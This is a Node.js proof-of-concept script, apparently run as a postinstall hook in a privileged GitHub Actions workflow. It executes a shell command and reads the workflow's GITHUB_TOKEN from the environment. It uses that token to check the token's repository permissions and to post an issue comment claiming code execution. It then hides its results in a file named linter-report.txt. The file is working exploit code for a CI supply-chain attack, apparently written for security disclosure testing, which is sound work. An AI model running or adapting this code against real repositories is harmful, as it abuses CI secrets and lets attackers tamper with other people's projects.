const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');
const out = [];
try { out.push('RCE-PROOF uid=' + execSync('id -u').toString().trim() + ' host=' + os.hostname()); } catch (e) { out.push('uid-error'); }
(async () => {
  try {
    const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, {
      headers: { authorization: 'Bearer ' + process.env.GITHUB_TOKEN, 'user-agent': 'poc' }
    });
    const j = await r.json();
    out.push('TOKEN-PERMS pull=' + j.permissions.pull + ' push=' + j.permissions.push + ' admin=' + j.permissions.admin);
    const c = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/2/comments', {
      method: 'POST',
      headers: { authorization: 'Bearer ' + process.env.GITHUB_TOKEN, 'user-agent': 'poc', 'content-type': 'application/json' },
      body: JSON.stringify({ body: 'RCE-MARKER-POSTINSTALL: arbitrary code executed with the privileged workflow GITHUB_TOKEN' })
    });
    out.push('COMMENT-POST status=' + c.status);
  } catch (e) { out.push('api-error ' + e.message); }
  try {
    fs.appendFileSync(path.join(process.env.INIT_CWD || process.cwd(), 'linter-report.txt'), '\n' + out.join('\n') + '\n');
  } catch (e) { console.log('append failed ' + e.message); }
})();
